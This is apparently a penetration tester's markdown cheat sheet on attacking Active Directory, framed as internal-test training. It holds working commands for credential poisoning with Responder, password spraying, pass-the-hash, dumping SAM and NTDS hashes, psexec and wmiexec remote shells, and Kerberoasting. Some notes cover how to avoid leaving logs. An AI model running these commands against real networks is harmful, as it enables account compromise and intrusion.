---
title: Active Directory
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - active
  - directory
  - ldap
  - windows
---
# Active Directory

!!! tip "Related resources"
	- [Powershell](powershell.md) and [cmd](cmd.md)
	- [LDAP](ldap.md)
	
## Reconnaissance: External Recon and Enumeration Principles

| **Resource**                     | **Examples**                                                                                                                                                                                                                                                                                                                                                                                                                             |
| -------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ASN / IP registrars`            | [IANA](https://www.iana.org/), [arin](https://www.arin.net/) for searching the Americas, [RIPE](https://www.ripe.net/) for searching in Europe, [BGP Toolkit](https://bgp.he.net/)                                                                                                                                                                                                                                                       |
| `Domain Registrars & DNS`        | [Domaintools](https://www.domaintools.com/), [PTRArchive](http://ptrarchive.com/), [ICANN](https://lookup.icann.org/lookup), manual DNS record requests against the domain in question or against well known DNS servers, such as `8.8.8.8`. [viewdns.info](https://viewdns.info/)                                                                                                                                                       |
| `Social Media`                   | Searching Linkedin, Twitter, Facebook, your region's major social media sites, news articles, and any relevant info you can find about the organization.                                                                                                                                                                                                                                                                                 |
| `Public-Facing Company Websites` | Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the "About Us" and "Contact Us" pages can also be gold mines.                                                                                                                                                                                                                                                       |
| `Cloud & Dev Storage Spaces`     | [GitHub](https://github.com/), [AWS S3 buckets & Azure Blog storage containers](https://grayhatwarfare.com/), [Google searches using "Dorks"](https://www.exploit-db.com/google-hacking-database)                                                                                                                                                                                                                                        |
| `Breach Data Sources`            | [HaveIBeenPwned](https://haveibeenpwned.com/) to determine if any corporate email accounts appear in public breach data, [Dehashed](https://www.dehashed.com/) to search for corporate emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login portals (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication. |

## Set up

 This is one common way that a client might select for us to perform an internal penetration test. A list of the types of setups a client may choose for testing includes:

- A penetration testing distro (typically Linux) as a virtual machine in their internal infrastructure that calls back to a jump host we control over VPN, and we can SSH into.
- A physical device plugged into an ethernet port that calls back to us over VPN, and we can SSH into.
- A physical presence at their office with our laptop plugged into an ethernet port.
- A Linux VM in either Azure or AWS with access to the internal network that we can SSH into using public key authentication and our public IP address whitelisted.
- VPN access into their internal network (a bit limiting because we will not be able to perform certain attacks such as LLMNR/NBT-NS Poisoning).
- From a corporate laptop connected to the client's VPN.
- On a managed workstation (typically Windows), physically sitting in their office with limited or no internet access or ability to pull in tools. They may also elect this option but give you full internet access, local admin, and put endpoint protection into monitor mode so you can pull in tools at will.
- On a VDI (virtual desktop) accessed using Citrix or the like, with one of the configurations described for the managed workstation typically accessible over VPN either remotely or from a corporate laptop.


## Attacking AD from Linux
### Tools


|Tool|Description|
|---|---|
|[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView)|A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting.|
|[BloodHound](https://github.com/BloodHoundAD/BloodHound)|Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://neo4j.com/) database for graphical analysis of the AD environment.|
|[SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)|The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.|
|[BloodHound.py](https://github.com/fox-it/BloodHound.py)|A Python-based BloodHound ingestor based on the [Impacket toolkit](https://github.com/CoreSecurity/impacket/). It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.|
|[Kerbrute](https://github.com/ropnop/kerbrute)|A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.|
|[Impacket toolkit](https://github.com/SecureAuthCorp/impacket)|A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.|
|[Responder](https://github.com/lgandx/Responder)|Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.|
|[Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1)|Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.|
|[C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh)|The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.|
|[rpcinfo](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo)|The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.|
|[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)|A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.|
|[CrackMapExec (CME)](https://github.com/byt3bl33d3r/CrackMapExec)|CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.|
|[Rubeus](https://github.com/GhostPack/Rubeus)|Rubeus is a C# tool built for Kerberos Abuse.|
|[GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)|Another Impacket module geared towards finding Service Principal names tied to normal users.|
|[Hashcat](https://hashcat.net/hashcat/)|A great hash cracking and password recovery tool.|
|[enum4linux](https://github.com/CiscoCXSecurity/enum4linux)|A tool for enumerating information from Windows and Samba systems.|
|[enum4linux-ng](https://github.com/cddmp/enum4linux-ng)|A rework of the original Enum4linux tool that works a bit differently.|
|[ldapsearch](https://linux.die.net/man/1/ldapsearch)|Built-in interface for interacting with the LDAP protocol.|
|[windapsearch](https://github.com/ropnop/windapsearch)|A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.|
|[DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray)|DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.|
|[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)|The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).|
|[smbmap](https://github.com/ShawnDEvans/smbmap)|SMB share enumeration across a domain.|
|[psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)|Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.|
|[wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)|Part of the Impacket toolkit, it provides the capability of command execution over WMI.|
|[Snaffler](https://github.com/SnaffCon/Snaffler)|Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.|
|[smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)|Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.|
|[setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11))|Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.|
|[Mimikatz](https://github.com/ParrotSec/mimikatz)|Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.|
|[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)|Remotely dump SAM and LSA secrets from a host.|
|[evil-winrm](https://github.com/Hackplayers/evil-winrm)|Provides us with an interactive shell on a host over the WinRM protocol.|
|[mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)|Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.|
|[noPac.py](https://github.com/Ridter/noPac)|Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.|
|[rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py)|Part of the Impacket toolset, RPC endpoint mapper.|
|[CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py)|Printnightmare PoC in python.|
|[ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)|Part of the Impacket toolset, it performs SMB relay attacks.|
|[PetitPotam.py](https://github.com/topotam/PetitPotam)|PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.|
|[gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)|Tool for manipulating certificates and TGTs.|
|[getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)|This tool will use an existing TGT to request a PAC for the current user using U2U.|
|[adidnsdump](https://github.com/dirkjanm/adidnsdump)|A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.|
|[gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)|Extracts usernames and passwords from Group Policy preferences files.|
|[GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)|Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.|
|[lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py)|SID bruteforcing tool.|
|[ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)|A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.|
|[raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)|Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.|
|[Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)|Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.|
|[PingCastle](https://www.pingcastle.com/documentation/)|Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security).|
|[Group3r](https://github.com/Group3r/Group3r)|Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).|
|[ADRecon](https://github.com/adrecon/ADRecon)|A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.|


### Enumeration

#### Hosts

We can use:

- wireshark

```shell-session
sudo -E wireshark
```

- [tcpdump](https://linux.die.net/man/8/tcpdump)

```shell-session
sudo tcpdump -i ens224 
```

- [net-creds](https://github.com/DanMcInerney/net-creds)
- [NetMiner](https://www.netminer.com/en/product/netminer.php)
- pktmon.exe: monitoring tool built-in, which was added to all editions of Windows 10.
- responder in analyzing mode:

>[Responder](https://github.com/lgandx/Responder-Windows) is a tool built to listen, analyze, and poison `LLMNR`, `NBT-NS`, and `MDNS` requests and responses. It has many more functions, but for now, all we are utilizing is the tool in its Analyze mode. This will passively listen to the network and not send any poisoned packets. We'll cover this tool more in-depth in later sections.

```bash
sudo responder -I ens224 -A 
```

- [Fping](fping.md) provides us with a similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with a host.


```bash
fping -a -g -s -q $ipRange
fping -agsq $ipRange
# -a: forces the tool to show only alive hosts.
# -g: tells the tool we want to perform a ping sweep instead of a standard ping.
# -s: prints stats at the end of the scan
# -q: not to show per-target results
```

- Classic ping:

```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```


#### Users

##### Kerbrute

[See kerbrute](kerbrute.md).

 It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts.
 This method does not generate Windows event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625), or a logon failure which is often monitored for.

**How it works?**

Basically, the tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error `PRINCIPAL UNKNOWN`, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid.

*This method of username enumeration does not cause logon failures and will not lock out accounts.*


```
sudo git clone https://github.com/ropnop/kerbrute.git

# Typing make help will show us the compiling options available.
cd kerbrute
make help

# type make all and compile one each for use on Linux, Windows, and Mac systems (an x86 and x64 version for each).
sudo make all

# The newly created dist directory will contain our compiled binaries.
ls -la dist

# Add the tool to our PATH to make it accessible from anywhere in the host. For that we make sure first of the PATH
echo $PATH

# and then we move the binary to a path, for instance
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

```
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
# d: domain
# --dc: domain controller
# -o: output file
```

**However**, using Kerbrute for username enumeration will generate event ID [4768: A Kerberos authentication ticket (TGT) was requested](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768).  Defenders can tune their SIEM tools to look for an influx of this event ID.

##### crackmapexec

[CrackMapExec](crackmapexec.md):

```shell-session
# This is a useful tool that will also show the badpwdcount
crackmapexec smb $ip --users

# Also, if we have valid credentials, we could extract the users with the flag --users
sudo crackmapexec smb $ip -u $username -p $password --users
```

As a matter of fact, if we have a foothold on the domain, we could perform the following enumeration:

```powershell
# Check if we can access a machine
crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN>

# Using a hash instead of a password, to authenticate ourselves: Pass the hash attack (PtH)
crackmapexec smb $ip -u <username> -H <hash> -d <DOMAIN>

# Enumerate active sessions
crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --sessions


# Get sam: extract hashes from all users authenticated in the machine 
crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --sam

# Get the ntds.dit, given that your user has permissions
crackmapexec smb $ip -u <username> -p <password> -d <DOMAIN> --ntds

# Check which machines we can access in a subnet
crackmapexec smb $ip/24 -u <username> -p <password> -d <DOMAIN>

# Enumerate logged on users in other hosts of the domain
crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --loggedon-users

# Enumerate users of the domain
sudo crackmapexec smb  $ip -u <username> -p <password> -d <DOMAIN> --users

crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --users

# Enumerate groups of the domain
crackmapexec smb $ip --local-auth -u <username> -p <password> -d <DOMAIN> --groups

```

##### rpcclient

[rpcclient](rpcclient.md) and the  SMB NULL session technique:

```shell-session
# Connect to a remote shared folder (same as smbclient in this regard)
rpcclient -U "" -N $ip

# Enumerate all domains that are deployed in the network 
enumdomains

# Provides domain, server, and user information of deployed domains.
querydominfo

# Enumerates all domain users.
enumdomusers
```


##### enum4linux

[enum4linux](enum4linux.md) 

```
# Enumerate users
enum4linux -U $ip  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

```


##### ldap 

LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.

###### ldapsearch

```shell-session
ldapsearch -h $ip -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

```

Other tools related to ldap: `windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py`.

######  windapsearch

[See more at windapsearch.](windapsearch.md)


```shell-session
# Enumerate Users
./windapsearch.py -d $domain -u $username\\ldapbind -p $password -U
# -U: returns only USERS
# -u: specifies username. "" for blank
# -p: indicates password
# -d: indicates domain

# Enumerate users with no user foothold
./windapsearch.py --dc-ip $ip -u "" -U
# -u: specifies username. "" for blank
# -U: returns only USERS

# Enumerate Domain Admins
./windapsearch.py --dc-ip $ip -u $username@$domain -p $password --da
./windapsearch.py -d $domain -u $username\\ldapbind -p $password --da
# --da: returns only Domain admins
# -u: specifies username. "" for blank
# -p: indicates password
# -d: indicates domain
# Example:
# python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

# Enumerating Computers
./windapsearch.py -d $domain -u $username\\ldapbind -p $password -C -r
# -r or --resolve option: the tool will perform a DNS lookup on every enumerated dNSHostName found and output the computer information, including IP address in CSV format. 
# -C: list all matching entries where objectClass=Computer

# Custom Search 
./windapsearch.py -d $domain -u $username\\ldapbind -p $password -s Lalala
# -s: search everywhere the term, in this case Lalala.

# Enumerate Privilege Users with -PU
python3 windapsearch.py --dc-ip $ip -u $username@$domain -p $password -PU
```


#### Password policy

The password policy can also be obtained remotely with:

##### crackmapexec

[CrackMapExec](crackmapexec.md):

```shell-session
# Obtain the password policy
crackmapexec smb $ip -u <username> -p <password> --pass-pol
```


##### rpcclient

[rpcclient](rpcclient.md) and the  SMB NULL session technique:

```shell-session
rpcclient -U "" -N $ip

rpcclient $> querydominfo
```


##### enum4linux

- [enum4linux](enum4linux.md) 

```shell-session
enum4linux -P $ip

enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

- [enum4linux-ng](enum4linux.md) 

```shell-session
enum4linux-ng.py -P <target> -oA ilfreight

# Enum4linux-ng provided us with a bit clearer output and handy JSON and YAML output using the -oA flag.
cat ilfreight.json 
```

##### Net

With net use:

```cmd-session
# Establish a null session from windows
net use \\DC01\ipc$ "" /u:""

# use a username/password combination to attempt to connect
net use \\DC01\ipc$ "" /u:guest
System error 1331 has occurred.
# Error: Account is Disabled

net use \\DC01\ipc$ "password" /u:guest
# System error 1326 has occurred.
# The user name or password is incorrect.

net use \\DC01\ipc$ "password" /u:guest
# System error 1909 has occurred.
# The referenced account is currently locked out and may not be logged on to.
```


##### ldap 

LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.

```shell-session
ldapsearch -h $ip -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Other tools related to ldap: `windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py`.

#### Credentials

##### LLMNR/NBT-NS Poisoning

[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails.

If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts.

It uses port `5355` over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port `137` over UDP.

The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with `Responder` to poison these requests.

Several tools can be used to attempt LLMNR & NBT-NS poisoning:

|**Tool**|**Description**|
|---|---|
|[Responder](https://github.com/lgandx/Responder)|Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.|
|[Inveigh](https://github.com/Kevin-Robertson/Inveigh)|Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.|
|[Metasploit](https://www.metasploit.com/)|Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.|

Listening with responder

```bash
sudo responder -I ens224 -A -wf
# sudo privileges or root to make sure that all ports needed are available on our attack host for it to function best.
# -w: The use of the -w flag utilizes the built-in WPAD proxy server. This can be highly effective, especially in large organizations, because it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled.
# -f: attempts to fingerprint the remote host operating system and version.
```

With this configuration shown above, Responder will listen and answer any requests it sees on the wire.

All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). 

**NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pass-the-hash**, meaning we have to attempt to crack them offline with [hashcat](hashcat.md) or [johntheripper](john-the-ripper.md). For example, in the case of a  NetNTLMv2 hash, we can copy the hash to a file and attempt to crack it using the hashcat module 5600. 

```shell-session
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
```

[See hashcat for other modules beside 5600](hashcat.md).

> Hashes are also stored in a SQLite database that can be configured in the `Responder.conf` config file, typically located in `/usr/share/responder` unless we clone the Responder repo directly from GitHub.



#### Shares

##### crackmapexec

[CrackMapExec](crackmapexec.md):

```shell-session
# Enumerate shares
crackmapexec smb $ip -u <username> -p <password> --shares

# The module spider_plus will dig through each readable share on the host and list all readable files. 
sudo crackmapexec smb  $ip --local-auth -u <username> -p <password> -d <DOMAIN> -M spider_plus --share 'NameOfShare'
# CME writes the results to a JSON file located at /tmp/cme_spider_plus/<ip of host>

```


##### SMBMap

[smbmap](smbmap.md)

```bash
# Enumerate network shares and access associated permissions.
smbmap -H $ip

# # Enumerate network shares and access associated permissions with recursivity
smbmap -H $ip -r
# --dir-only: provides only the output of all directories and did not list all files.

# Check access and permissions level for a folder with recursion
smbmap -u $username -p $password -d $domain -H $ip -R $nameofFolder --dir-only


```

##### rpcclient

[rpcclient](rpcclient.md)

```bash
# SMB NULL Session with rpcclient
rpcclient -U "" -N $ip
```



```shell-session
# SMB NULL Session with rpcclient
rpcclient -U "" -N $ip

# Connect to a remote shared folder (same as smbclient in this regard)
rpcclient -U "" 10.129.14.128
rpcclient -U'%' 10.10.110.17

# Server information
srvinfo

# Enumerate all domains that are deployed in the network 
enumdomains

# Provides domain, server, and user information of deployed domains.
querydominfo

# Enumerates all available shares.
netshareenumall

# Provides information about a specific share.
netsharegetinfo <share>

# Get Domain Password Information
getdompwinfo

# Enumerates all domain users.
enumdomusers

# Provides information about a specific user.
queryuser <RID>
	# An example:
	# rpcclient $> queryuser 0x3e8

# Provides information about a specific group.
querygroup <ID>

# Enumerating Privileges
enumprivs

# Enumerating SID from LSA
lsaenumsid
```

### Password spraying attack

Steps:

- Build a user list (with previous techniques)
- Consider your password list.

From previous section we used kerbrute to build a userlist:

```
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```


#### Password spraying attack with kerbrute

```shell-session
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1
```

#### Password spraying attack with rpcclient

```shell-session
for u in $(cat valid_ad_users);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login. We can filter out invalid login attempts by grepping for Authority in the response. 

#### Password spraying attack with crackmapexec

```shell-session
sudo crackmapexec smb 172.16.5.5 -u valid_ad_users -p Password123 | grep +

# Spraying password with crackmapexec
crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +
# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.
# -H: hash
```

### Lateral Movement

####  Spraying password technique in the domain with crackmapexec

```
# Spraying password with crackmapexec
crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +
# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.
# -H: hash
```

**This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth.** 


### Privileges escalation 

There are several ways to gain SYSTEM-level access on a host, including but not limited to:

- Remote Windows exploits such as MS08-067, EternalBlue, or BlueKeep.
- Abusing a service running in the context of the `SYSTEM account`, or abusing the service account `SeImpersonate` privileges using [Juicy Potato](https://github.com/ohpe/juicy-potato). This type of attack is possible on older Windows OS' but not always possible with Windows Server 2019.
- Local privilege escalation flaws in Windows operating systems such as the Windows 10 Task Scheduler 0-day.
- Gaining admin access on a domain-joined host with a local account and using Psexec to launch a SYSTEM cmd window


By gaining SYSTEM-level access on a domain-joined host, you will be able to perform actions such as, but not limited to:

- Enumerate the domain using built-in tools or offensive tools such as BloodHound and PowerView.
- Perform Kerberoasting / ASREPRoasting attacks within the same domain.
- Run tools such as Inveigh to gather Net-NTLMv2 hashes or perform SMB relay attacks.
- Perform token impersonation to hijack a privileged domain user account.
- Carry out ACL attacks.

#####  PSExec.py

Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.


```shell-session
# Get help 
impacket-psexec -h

# Connect to a remote machine with a local administrator account
psexec.py $domain/$user:$password@$ip 

# Another way
impacket-psexec administrator:'<password>'@$ip
# Examples:
# psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.130
# impacket-psexec inlanefreight.local/wley:'transporter@4'@172.16.5.130
```

```
# Results
C:\Windows\system32>whoami
nt authority\system
```
##### wmiexec.py

Wmiexec.py utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands).

```shell-session
# Connect to a remote machine with a local administrator account
wmiexec.py $domain/$user:$password@$ip 
# Examples:
# impacket-wmiexec inlanefreight.local/wley:'transporter@4'@172.16.5.5 
# wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```


```
# Results
C:>whoami
domain\user22
```


##### Kerberoasting

[See about Kerberos authentication](kerberos-authentication.md).

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. 

Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\LOCAL SERVICE`. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary.

Requirements to perform a Kerberoasting attack:

- an account's cleartext password (or NTLM hash),
- a shell in the context of a domain user account or SYSTEM level access on a domain-joined host.

Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.

Several tools can be utilized to perform the attack:

- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

###### GetUserSPNs.py

[More about GetUserSPNs.py](impacket-GetUserSPNs.md).

**1**. Install Impacket from: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)

```bash
git clone https://github.com/fortra/impacket
cd impacket
sudo python3 -m pip install .
```

**2.** Gather a listing of SPNs in the domain. We will need a set of valid domain credentials and the IP address of a Domain Controller.

```bash
GetUserSPNs.py -dc-ip $ip $domain/$username
# -dc-ip: Domain controller IP.
# Example:
# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

**3.** Requesting all TGS Tickets:

```bash
GetUserSPNs.py -dc-ip $ip $domain/$username -request 
# Example:
# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

**4.** Or request just the TGS ticket for a specific account. 

```bash
GetUserSPNs.py -dc-ip $ip $domain/$username -request-user $userrequested -outputfile file_tgs
# -outputfile:  to write the TGS tickets to a file 
# Example:
# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```


**5.** Cracking the Ticket Offline with Hashcat.

```bash
hashcat -m 13100 file_tgs /usr/share/wordlists/rockyou.txt 
```

## Attacking AD from Windows

### Enumeration

**Tool for enumeration**: 

- [Enumeration with LDAP queries](389-636-ldap.md)
- [PowerView.ps1 from PowerSploit project (powershell)](powerview.md).
- [The ActiveDirectory PowerShell module (powershell)](activedirectory-powershell-module.md).
